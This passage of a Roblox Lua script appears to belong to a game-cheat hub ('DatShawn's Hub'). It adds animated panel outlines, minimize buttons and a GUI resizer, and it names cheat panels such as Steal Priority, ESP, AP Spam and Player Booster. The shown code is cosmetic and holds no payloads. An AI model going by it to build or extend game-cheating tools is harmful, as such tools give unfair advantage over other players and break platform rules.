    if shouldStyleGui(gui) then
        styleScreenGui(gui)
        gui.DescendantAdded:Connect(function(object)
            task.defer(function()
                if object and object.Parent then
                    styleObject(object)
                end
            end)
        end)
    end
end

PlayerGui.ChildAdded:Connect(function(gui)
    if not shouldStyleGui(gui) then return end
    task.defer(function()
        if gui and gui.Parent then
            styleScreenGui(gui)
            gui.DescendantAdded:Connect(function(object)
                task.defer(function()
                    if object and object.Parent then
                        styleObject(object)
                    end
                end)
            end)
        end
    end)
end)

-- Moving red outline: the highlight travels around the border while the
-- thickness/transparency gently pulses for a subtle "vibrating" effect.
local elapsed = 0
RunService.RenderStepped:Connect(function(dt)
    elapsed += dt
    local wave = (math.sin(elapsed * 5.5) + 1) * 0.5
    local travel = (elapsed * 0.42) % 1

    for s in pairs(styledStrokes) do
        if not s or not s.Parent then
            styledStrokes[s] = nil
        else
            local gradient = s:FindFirstChild("DatShawnRedMotion")
            if gradient then
                gradient.Offset = Vector2.new(travel, 0)
            end
            s.Thickness = 1.35 + wave * 0.85
            s.Transparency = 0.03 + wave * 0.14
        end
    end
end)
]====]))()



-- Clean panel minimizer + Neptune-style GUI resizer layer.
;(loadstring([====[
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
local MAIN = PlayerGui:FindFirstChild("DatShawnsScriptsGUI")
if not MAIN then return end
local M = {states=setmetatable({}, {__mode="k"})}
local function excluded(o)
    if not o then return true end
    local n=o.Name
    return n=="AutoGrabBar" or n=="ShawnButton" or n=="HubBanner" or n=="DatShawnGuiResizer" or n=="DatShawnFeatureESP" or n=="PriorityLauncher" or n=="Main"
end
local function isPanelCandidate(child)
    if not child or not child:IsA("GuiObject") or excluded(child) then return false end
    local n=child.Name
    if n=="Mini_Steal Priority" or n=="BoosterMini" or n=="DatShawnAPSpam" or n=="CommandCooldowns" or n=="Root" then return true end
    if n:find("Panel") or n:find("Frame") or n:find("Timer") or n:sub(1,5)=="Mini_" then return true end
    return false
end
local function findHeader(panel)
    for _,child in ipairs(panel:GetChildren()) do
        if child:IsA("Frame") then
            local n=child.Name:lower()
            if n=="header" or n=="titlebar" or n=="topbar" then return child end
        end
    end
end
local function findTitleLabel(panel,title)
    local wanted=tostring(title or ""):lower()
    local fallback=nil
    for _,child in ipairs(panel:GetDescendants()) do
        if child:IsA("TextLabel") then
            local text=(child.Text or ""):lower()
            if text==wanted then return child end
            if wanted~="" and (text:find(wanted,1,true) or wanted:find(text,1,true)) then fallback=child end
        end
    end
    return fallback
end
local function addMinimize(panel,title)
    if not panel or not panel:IsA("GuiObject") or excluded(panel) or M.states[panel] then return end
    local header=findHeader(panel)
    local titleLabel=findTitleLabel(panel,title)
    if panel.Name=="DatShawnAPSpam" then
        -- Keep the main AP title, but remove any duplicate/tiny DatShawn AP Spam labels.
        titleLabel=panel:FindFirstChild("APTitle") or titleLabel
        for _,d in ipairs(panel:GetDescendants()) do
            if d:IsA("TextLabel") and d ~= titleLabel then
                local t=(d.Text or ""):lower():gsub("%s+"," ")
                if t:find("datshawn",1,true) and t:find("ap spam",1,true) then
                    d:Destroy()
                end
            end
        end
    end
    local state={panel=panel,header=header,originalSize=panel.Size,originalClip=panel.ClipsDescendants,minimized=false,visible={},headerVisible={}}
    M.states[panel]=state
    local host=header or panel
    local old=host:FindFirstChild("DatShawnMinimize"); if old then old:Destroy() end
    local minus=Instance.new("TextButton")
    minus.Name="DatShawnMinimize"; minus.Size=UDim2.fromOffset(22,20); minus.Position=UDim2.new(1,-28,0,5)
    minus.BackgroundColor3=Color3.fromRGB(27,29,38); minus.BorderSizePixel=0; minus.Text="-"; minus.TextColor3=Color3.fromRGB(245,245,250); minus.Font=Enum.Font.GothamBold; minus.TextSize=14; minus.ZIndex=math.max(panel.ZIndex+20,100); minus.Parent=host
    Instance.new("UICorner",minus).CornerRadius=UDim.new(0,5)
    if not titleLabel then
        titleLabel=Instance.new("TextLabel"); titleLabel.Name="DatShawnMiniName"; titleLabel.BackgroundTransparency=1; titleLabel.Position=UDim2.fromOffset(10,0); titleLabel.Size=UDim2.new(1,-38,0,30); titleLabel.Text=tostring(title); titleLabel.TextColor3=Color3.fromRGB(245,245,250); titleLabel.Font=Enum.Font.GothamBold; titleLabel.TextSize=11; titleLabel.TextXAlignment=Enum.TextXAlignment.Left; titleLabel.ZIndex=minus.ZIndex; titleLabel.Parent=host
    else
        titleLabel.ZIndex=math.max(titleLabel.ZIndex,minus.ZIndex)
    end
    -- Headerless panels get a top-right minus; Auto Defense keeps its compact size.
    if not header then minus.Position=UDim2.new(1,-28,0,5) end
    local function setMinimized(on)
        state.minimized=on==true
        if state.minimized then
            state.originalSize=panel.Size; state.originalClip=panel.ClipsDescendants; table.clear(state.visible); table.clear(state.headerVisible)
            for _,child in ipairs(panel:GetChildren()) do
                if child~=header and child~=minus and child~=titleLabel and child:IsA("GuiObject") then state.visible[child]=child.Visible; child.Visible=false end
            end
            if header then
                for _,child in ipairs(header:GetChildren()) do
                    if child~=minus and child~=titleLabel and child:IsA("GuiObject") then state.headerVisible[child]=child.Visible; child.Visible=false end
                end
            end
            titleLabel.Text=tostring(title); titleLabel.Visible=true
            panel.ClipsDescendants=true; panel.Size=UDim2.new(state.originalSize.X.Scale,state.originalSize.X.Offset,0,header and 30 or 32); minus.Text="-"
        else
            panel.Size=state.originalSize; panel.ClipsDescendants=state.originalClip
            for child,vis in pairs(state.visible) do if child and child.Parent then child.Visible=vis end end
            for child,vis in pairs(state.headerVisible) do if child and child.Parent then child.Visible=vis end end
            table.clear(state.visible); table.clear(state.headerVisible); minus.Text="-"
        end
    end
    minus.Activated:Connect(function() setMinimized(not state.minimized) end)
end
local function registerRoot(root)
    if not root then return end
    local explicit={
        ["QUICK PANEL"]="Quick Panel", ["COMMAND COOLDOWNS"]="Command Cooldowns", ["DATSHAWN'S AP SPAM"]="DatShawn's AP Spam",
        ["XD SPAM"]="XD Spam", ["AUTO DEFENSE"]="Auto Defense", ["ACTIONS PANEL"]="Actions Panel", ["MY BASE TIME"]="My Base Time",
        ["DATSHAWN PLAYER BOOSTER"]="DatShawn Player Booster", ["ALLOW BASE"]="Allow Base", ["STEAL PRIORITY"]="Steal Priority",
    }
    local seen={}
    for _,child in ipairs(root:GetDescendants()) do
        if child:IsA("TextLabel") then
            local key=(child.Text or ""):upper():gsub("%s+"," "):gsub("^%s+",""):gsub("%s+$","")
            local title=explicit[key]
            if title and key ~= "AUTO DEFENSE" then
                local panel=child:FindFirstAncestorOfClass("Frame")
                if panel and not seen[panel] and not excluded(panel) then seen[panel]=true; addMinimize(panel,title) end
            end
        end
    end
    for _,child in ipairs(root:GetChildren()) do
        if isPanelCandidate(child) and not seen[child] then
            local n=child.Name; local title=n:gsub("^Mini_","")
            if n=="Root" then title="XD Spam" elseif n=="BoosterMini" then title="DatShawn Player Booster" elseif n=="DatShawnAPSpam" then title="DatShawn AP Spam" elseif n=="CommandCooldowns" then title="Command Cooldowns" end
            seen[child]=true; addMinimize(child,title)
        end
    end
end
registerRoot(MAIN)
-- Remove minimize controls only from the DatShawn's Hub CTRL panel itself.
local ctrlPanel = MAIN:FindFirstChild("Main")
if ctrlPanel then
    for _,d in ipairs(ctrlPanel:GetDescendants()) do
        if d.Name=="DatShawnMinimize" or d.Name=="DatShawnMiniName" then d:Destroy() end
    end
end
task.defer(function()
    local pg=PlayerGui:FindFirstChild("AutoStealPriorityStandalone")
    if pg then
        for _,d in ipairs(pg:GetDescendants()) do if d:IsA("TextButton") and d.Text=="×" then d.Visible=false end end
        registerRoot(pg)
        pg.ChildAdded:Connect(function(child) task.defer(function() if child:IsA("Frame") then registerRoot(pg) end end) end)
    end
end)
MAIN.ChildAdded:Connect(function(child) task.defer(function() if child:IsA("Frame") then registerRoot(MAIN) end end) end)
local function getScale(panel)
    local scale=panel:FindFirstChild("DatShawnUserScale")
    if not scale then scale=Instance.new("UIScale"); scale.Name="DatShawnUserScale"; scale.Scale=1; scale.Parent=panel end
    return scale
end
local function openResizer()
    local old=PlayerGui:FindFirstChild("DatShawnGuiResizer"); if old then old:Destroy(); return end
    local entries={}
    for panel in pairs(M.states) do if panel and panel.Parent then local sc=getScale(panel); entries[#entries+1]={panel=panel,scale=sc,value=math.floor(sc.Scale*100+.5)} end end
    local gui=Instance.new("ScreenGui"); gui.Name="DatShawnGuiResizer"; gui.ResetOnSpawn=false; gui.IgnoreGuiInset=true; gui.DisplayOrder=100000; gui.Parent=PlayerGui
    local win=Instance.new("Frame"); win.Size=UDim2.fromOffset(350,420); win.Position=UDim2.fromScale(.5,.5); win.AnchorPoint=Vector2.new(.5,.5); win.BackgroundColor3=Color3.fromRGB(10,10,15); win.BorderSizePixel=0; win.Parent=gui; Instance.new("UICorner",win).CornerRadius=UDim.new(0,12)
    local title=Instance.new("TextLabel"); title.Size=UDim2.new(1,-55,0,35); title.Position=UDim2.fromOffset(14,5); title.BackgroundTransparency=1; title.Text="GUI RESIZER"; title.TextColor3=Color3.new(1,1,1); title.Font=Enum.Font.GothamBold; title.TextSize=14; title.TextXAlignment=Enum.TextXAlignment.Left; title.Parent=win
    local close=Instance.new("TextButton"); close.Size=UDim2.fromOffset(28,28); close.Position=UDim2.new(1,-38,0,8); close.Text="×"; close.TextColor3=Color3.new(1,1,1); close.BackgroundColor3=Color3.fromRGB(35,35,45); close.Font=Enum.Font.GothamBold; close.TextSize=18; close.Parent=win; Instance.new("UICorner",close).CornerRadius=UDim.new(0,7); close.Activated:Connect(function() gui:Destroy() end)
    local list=Instance.new("ScrollingFrame"); list.Size=UDim2.new(1,-20,1,-55); list.Position=UDim2.fromOffset(10,48); list.BackgroundTransparency=1; list.BorderSizePixel=0; list.ScrollBarThickness=4; list.Parent=win; local layout=Instance.new("UIListLayout"); layout.Padding=UDim.new(0,7); layout.Parent=list
    for _,e in ipairs(entries) do
        local row=Instance.new("Frame"); row.Size=UDim2.new(1,-5,0,55); row.BackgroundColor3=Color3.fromRGB(23,25,34); row.BorderSizePixel=0; row.Parent=list; Instance.new("UICorner",row).CornerRadius=UDim.new(0,8)
        local label=Instance.new("TextLabel"); label.Size=UDim2.new(.42,0,0,25); label.Position=UDim2.fromOffset(8,4); label.BackgroundTransparency=1; label.Text=e.panel.Name:gsub("^Mini_",""); label.TextColor3=Color3.new(1,1,1); label.Font=Enum.Font.GothamBold; label.TextSize=10; label.TextXAlignment=Enum.TextXAlignment.Left; label.Parent=row
        local value=Instance.new("TextLabel"); value.Size=UDim2.fromOffset(45,20); value.Position=UDim2.new(1,-53,0,4); value.BackgroundTransparency=1; value.Text=e.value.."%"; value.TextColor3=Color3.fromRGB(190,195,210); value.Font=Enum.Font.GothamBold; value.TextSize=10; value.Parent=row
        local track=Instance.new("Frame"); track.Size=UDim2.new(1,-16,0,7); track.Position=UDim2.fromOffset(8,38); track.BackgroundColor3=Color3.fromRGB(50,52,62); track.BorderSizePixel=0; track.Parent=row; Instance.new("UICorner",track).CornerRadius=UDim.new(1,0)
        local fill=Instance.new("Frame"); fill.Size=UDim2.new((e.value-35)/165,0,1,0); fill.BackgroundColor3=Color3.fromRGB(100,125,220); fill.BorderSizePixel=0; fill.Parent=track; Instance.new("UICorner",fill).CornerRadius=UDim.new(1,0)
        local dragging=false
        local function move(x) local pct=math.clamp((x-track.AbsolutePosition.X)/math.max(track.AbsoluteSize.X,1),0,1); e.value=math.floor(35+pct*165+.5); e.scale.Scale=e.value/100; value.Text=e.value.."%"; fill.Size=UDim2.new(pct,0,1,0) end
        track.InputBegan:Connect(function(inp) if inp.UserInputType==Enum.UserInputType.MouseButton1 or inp.UserInputType==Enum.UserInputType.Touch then dragging=true; move(inp.Position.X) end end)
        UIS.InputChanged:Connect(function(inp) if dragging and (inp.UserInputType==Enum.UserInputType.MouseMovement or inp.UserInputType==Enum.UserInputType.Touch) then move(inp.Position.X) end end)
        UIS.InputEnded:Connect(function(inp) if inp.UserInputType==Enum.UserInputType.MouseButton1 or inp.UserInputType==Enum.UserInputType.Touch then dragging=false end end)
    end
    list.CanvasSize=UDim2.fromOffset(0,#entries*62)
end
task.defer(function()
    local utils=MAIN:FindFirstChild("UtilsPage"); if not utils then return end
    local old=utils:FindFirstChild("DatShawnGuiResizerRow"); if old then old:Destroy() end
    local row=Instance.new("Frame"); row.Name="DatShawnGuiResizerRow"; row.Size=UDim2.new(1,0,0,44); row.Position=UDim2.fromOffset(0,2); row.BackgroundColor3=Color3.fromRGB(23,25,34); row.BorderSizePixel=0; row.Parent=utils; Instance.new("UICorner",row).CornerRadius=UDim.new(0,8)
    local label=Instance.new("TextLabel"); label.Size=UDim2.new(1,-105,1,0); label.Position=UDim2.fromOffset(10,0); label.BackgroundTransparency=1; label.Text="GUI Resizer"; label.TextColor3=Color3.fromRGB(235,235,245); label.Font=Enum.Font.GothamBold; label.TextSize=11; label.TextXAlignment=Enum.TextXAlignment.Left; label.Parent=row
    local open=Instance.new("TextButton"); open.Size=UDim2.fromOffset(84,30); open.Position=UDim2.new(1,-94,0,7); open.BackgroundColor3=Color3.fromRGB(67,52,145); open.Text="OPEN"; open.TextColor3=Color3.new(1,1,1); open.Font=Enum.Font.GothamBold; open.TextSize=10; open.Parent=row; Instance.new("UICorner",open).CornerRadius=UDim.new(0,7); open.Activated:Connect(openResizer)
end)
]====]))()
